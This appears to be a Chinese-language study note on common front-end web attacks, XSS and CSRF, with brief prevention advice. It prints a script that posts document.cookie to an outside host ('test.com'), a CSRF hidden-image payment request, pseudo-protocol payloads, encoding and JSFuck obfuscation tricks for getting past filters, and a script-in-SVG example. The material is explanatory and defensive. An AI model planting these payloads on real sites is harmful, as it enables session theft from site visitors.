<template><h1 id="常见的-web-前端攻击方式有哪些" tabindex="-1"><a class="header-anchor" href="#常见的-web-前端攻击方式有哪些" aria-hidden="true">#</a> 常见的 web 前端攻击方式有哪些？</h1>
<p>安全</p>
<ul>
<li>XSS 跨站请求攻击（反射型，存储型，DOM型）</li>
<li>XSRF 跨站请求伪造</li>
</ul>
<p>XSS 跨站请求攻击</p>
<p>比如：一个博客网站，我发表一篇博客，其中嵌入 <code>&lt;script /&gt;</code>脚本，获取 cookie，发送到我的跨域服务器，当有人查看这篇文章，我可以获取访问者的 cookie</p>
<div class="language-javascript ext-js"><pre v-pre class="language-javascript"><code><span class="token operator">&lt;</span>p<span class="token operator">></span>模拟 <span class="token constant">XSS</span> 跨站，获取 cookie<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span> <span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>$<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'test.com'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>cookie<span class="token operator">:</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
</code></pre></div><p>XSS 预防（也可以使用 XSS 工具，如 <a href="https://www.npmjs.com/package/xss" target="_blank" rel="noopener noreferrer">https://www.npmjs.com/package/xss<OutboundLink/></a>）</p>
<ul>
<li>替换特殊字符，如 &lt; 变成<code>&amp;lt;</code> &gt; 变成<code>`&amp;gt;`</code></li>
<li><code>&lt;script&gt;</code> 变成 <code>&amp;lt;script&amp;gt;</code> ,这样不会作为脚本执行</li>
<li>建议前后端都替换</li>
</ul>
<div class="language-javascript ext-js"><pre v-pre class="language-javascript"><code><span class="token operator">&amp;</span>lt<span class="token punctuation">;</span>script<span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> <span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>$<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'test.com'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>cookie<span class="token operator">:</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">/</span>script<span class="token operator">&amp;</span>gt<span class="token punctuation">;</span>
</code></pre></div><p>CSRF/XSRF 跨站请求伪造</p>
<p>比如：你正在购物，看中了某个商品，商品 id 是 100，付款接口：xxx.com/pay?id=100，但没任何验证，攻击者想购买 id 为 200 的商品，通过发送邮件隐藏 <code>&lt;img src=&quot;xxx.com/pay?id=200&quot; /&gt;</code>，一旦查看邮件，就购买了 id 为 200 的商品</p>
<p>XSRF 预防（现在很少见了）</p>
<ul>
<li>使用 post 接口</li>
<li>增加验证，例如密码，短信验证码，指纹等</li>
</ul>
<p><strong>其他</strong></p>
<p>为协议：</p>
<ul>
<li>Data 为协议：data:text/html;base64,PHNjcsdd=</li>
<li>JavaScript为协议：javascript:alert(1)</li>
</ul>
<p>Unicode 编码及 URL 编码绕过：</p>
<ul>
<li>JavaScript 编码：&amp;#x，\u 都可以用来表示一串 Unicode 编码，如：\u0074 \u0065 \u0073 \u0074 或 &amp;#x0074 &amp;#x0065 &amp;#x0073 &amp;#x0074</li>
<li>HTML实体编码：&amp;#116 &amp;#101 &amp;#115 &amp;#116</li>
<li>URL编码：%74 %65 %73 %74</li>
</ul>
<p>xss 蠕虫，比如： myspace蠕虫攻击</p>
<p>xss 编码混淆，利用浏览器解析编码的顺序 js &lt;- url &lt;- html，比如： jsFuck 使用 6 个字符 []()!+ 来编写</p>
<div class="language-javascript ext-js"><pre v-pre class="language-javascript"><code><span class="token parameter"><span class="token boolean">false</span></span>       <span class="token operator">=></span>  <span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token parameter"><span class="token boolean">true</span></span>        <span class="token operator">=></span>  <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token parameter"><span class="token keyword">undefined</span></span>   <span class="token operator">=></span>  <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token parameter"><span class="token number">NaN</span></span>         <span class="token operator">=></span>  <span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token number">0</span>           <span class="token operator">=></span>  <span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token number">1</span>           <span class="token operator">=></span>  <span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token number">2</span>           <span class="token operator">=></span>  <span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token number">10</span>          <span class="token operator">=></span>  <span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token parameter">Array</span>       <span class="token operator">=></span>  <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token parameter">Number</span>      <span class="token operator">=></span>  <span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token parameter">String</span>      <span class="token operator">=></span>  <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token parameter">Boolean</span>     <span class="token operator">=></span>  <span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token parameter">Function</span>    <span class="token operator">=></span>  <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"filter"</span><span class="token punctuation">]</span>
<span class="token parameter">run</span>         <span class="token operator">=></span>  <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"filter"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">(</span> <span class="token constant">CODE</span> <span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token parameter">eval</span>        <span class="token operator">=></span>  <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"filter"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"return eval"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span> <span class="token constant">CODE</span> <span class="token punctuation">)</span>
<span class="token parameter">window</span>      <span class="token operator">=></span>  <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"filter"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"return this"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><p>SVG 文件中插入 JS 代码</p>
<div class="language-javascript ext-js"><pre v-pre class="language-javascript"><code><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> standalone<span class="token operator">=</span><span class="token string">"no"</span><span class="token operator">?</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> svg <span class="token constant">PUBLIC</span> <span class="token string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="token string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span><span class="token operator">></span>
<span class="token operator">&lt;</span>svg width<span class="token operator">=</span><span class="token string">"100%"</span> height<span class="token operator">=</span><span class="token string">"100%"</span> version<span class="token operator">=</span><span class="token string">"1.1"</span> xmlns<span class="token operator">=</span><span class="token string">"http://www.w3.org/2000/svg"</span><span class="token operator">></span>
	<span class="token operator">&lt;</span>script<span class="token operator">></span>
		<span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
	<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>svg<span class="token operator">></span>
</code></pre></div></template>
